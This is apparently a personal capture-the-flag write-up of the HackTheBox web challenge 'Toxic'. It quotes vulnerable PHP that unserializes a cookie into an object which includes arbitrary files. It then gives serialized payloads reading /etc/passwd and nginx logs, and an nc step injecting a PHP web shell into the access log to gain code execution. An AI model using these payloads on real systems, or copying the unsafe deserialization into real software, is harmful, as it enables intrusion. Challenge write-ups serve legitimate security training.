---
Category:
  - Web
Difficulty: Easy
Platform: HackTheBox
Status: 3. Complete
tags: [LFI, code-review, log-poisoning, php-deserialization]
---
>[!quote]
>*Humanity has exploited our allies, the dart frogs, for far too long, take back the freedom of our lovely poisonous friends. Malicious input is out of the question when dart frogs meet industrialisation. 🐸*


# Set up

-

# Information Gathering

Site:

![Pasted image 20210504210757.png](../../zzz_res/attachments/Pasted_image_20210504210757.png)

Archive:

```
┌──(kali㉿kali)-[~/…/HTB/challange/web/Toxic]
└─$ unzip Toxic.zip
Archive:  Toxic.zip
   creating: web_toxic/
[Toxic.zip] web_toxic/flag password:
 extracting: web_toxic/flag
   creating: web_toxic/config/
  inflating: web_toxic/config/fpm.conf
  inflating: web_toxic/config/supervisord.conf
  inflating: web_toxic/config/nginx.conf
  inflating: web_toxic/Dockerfile
  inflating: web_toxic/build-docker.sh
   creating: web_toxic/challenge/
  inflating: web_toxic/challenge/index.html
  inflating: web_toxic/challenge/index.php
   creating: web_toxic/challenge/models/
  inflating: web_toxic/challenge/models/PageModel.php
   creating: web_toxic/challenge/static/
   creating: web_toxic/challenge/static/css/
  inflating: web_toxic/challenge/static/css/production.css
   creating: web_toxic/challenge/static/images/
 extracting: web_toxic/challenge/static/images/favicon.ico
  inflating: web_toxic/challenge/static/images/dart-frog.jpg
  inflating: web_toxic/challenge/static/images/drift.svg
  inflating: web_toxic/challenge/static/images/newrelic.svg
  inflating: web_toxic/challenge/static/images/instagram.svg
  inflating: web_toxic/challenge/static/images/segment.svg
  inflating: web_toxic/challenge/static/images/flask.svg
  inflating: web_toxic/challenge/static/images/presentor.jpg
  inflating: web_toxic/challenge/static/images/facebook.svg
  inflating: web_toxic/challenge/static/images/bucket.svg
  inflating: web_toxic/challenge/static/images/stripe.svg
  inflating: web_toxic/challenge/static/images/youtube.svg
  inflating: web_toxic/challenge/static/images/aircraft.svg
  inflating: web_toxic/challenge/static/images/ryan3.png
  inflating: web_toxic/challenge/static/images/ryan2.png
  inflating: web_toxic/challenge/static/images/twitter.svg
  inflating: web_toxic/challenge/static/images/zopim.svg
  inflating: web_toxic/challenge/static/images/ryan1.png
  inflating: web_toxic/challenge/static/images/ryan5.png
  inflating: web_toxic/challenge/static/images/woman1.jpg
  inflating: web_toxic/challenge/static/images/logo.svg
  inflating: web_toxic/challenge/static/images/ryan4.png
  inflating: web_toxic/challenge/static/images/ryan6.png
  inflating: web_toxic/challenge/static/images/woman2.jpg
  inflating: web_toxic/challenge/static/images/woman3.jpg
   creating: web_toxic/challenge/static/js/
  inflating: web_toxic/challenge/static/js/production.js
   creating: web_toxic/challenge/static/basement/
  inflating: web_toxic/challenge/static/basement/help.png
  inflating: web_toxic/entrypoint.sh
```

## Important files

**Index.php**

```php
<?php
spl_autoload_register(function ($name){
    if (preg_match('/Model$/', $name))
    {
        $name = "models/${name}";
    }
    include_once "${name}.php";
});

if (empty($_COOKIE['PHPSESSID']))
{
    $page = new PageModel;
    $page->file = '/www/index.html';

    setcookie(
        'PHPSESSID',
        base64_encode(serialize($page)),
        time()+60*60*24,
        '/'
    );
}

$cookie = base64_decode($_COOKIE['PHPSESSID']);
unserialize($cookie);
```

**challenge/models/PageModel.php**

```php
<?php
class PageModel
{
    public $file;

    public function __destruct()
    {
        include($this->file);
    }
}
```

## Cookie are serialized

![Pasted image 20210504211953.png](../../zzz_res/attachments/Pasted_image_20210504211953.png)

# The Bug

## PHP LFI using deserialization

Enumerated users:

`<@base64>O:9:"PageModel":1:{s:4:"file";s:33:"php://filter/resource=/etc/passwd";}<@/base64>`

![Pasted image 20210504221128.png](../../zzz_res/attachments/Pasted_image_20210504221128.png)

# Exploitation

Enumerated conf file:

```bash
┌──(kali㉿kali)-[~/…/challange/web/Toxic/web_toxic]
└─$ cat Dockerfile
...
# Configure php-fpm and nginx
COPY config/fpm.conf /etc/php7/php-fpm.d/www.conf
COPY config/supervisord.conf /etc/supervisord.conf
COPY config/nginx.conf /etc/nginx/nginx.conf
...
```

`<@base64>O:9:"PageModel":1:{s:4:"file";s:21:"/etc/nginx/nginx.conf";}<@/base64>`

![Pasted image 20210504224723.png](../../zzz_res/attachments/Pasted_image_20210504224723.png)

Enumerated log file:

`<@base64>O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}<@/base64>`

![Pasted image 20210504224802.png](../../zzz_res/attachments/Pasted_image_20210504224802.png)

## LFI2RCE - Log Poisoning

Poisoned the logs:

```bash
┌──(kali㉿kali)-[~/CTFs/THM/Buffer-Overflow-Prep/oscp.exe-2]
└─$ nc -nv 138.68.140.56  32248
(UNKNOWN) [138.68.140.56] 32248 (?) open
<?php echo shell_exec($_GET['cmd']); ?>
HTTP/1.1 400 Bad Request
Server: nginx
Date: Tue, 04 May 2021 20:52:50 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 150
Connection: close

<html>
<head><title>400 Bad Request</title></head>
<body>
<center><h1>400 Bad Request</h1></center>
<hr><center>nginx</center>
</body>
</html>
```

Get RCE:

![Pasted image 20210504225420.png](../../zzz_res/attachments/Pasted_image_20210504225420.png)

![Pasted image 20210504225501.png](../../zzz_res/attachments/Pasted_image_20210504225501.png)

![Pasted image 20210504225602.png](../../zzz_res/attachments/Pasted_image_20210504225602.png)

# Flag

>[!success]
>`HTB{P0i5on_1n_Cyb3r_W4rF4R3?!}`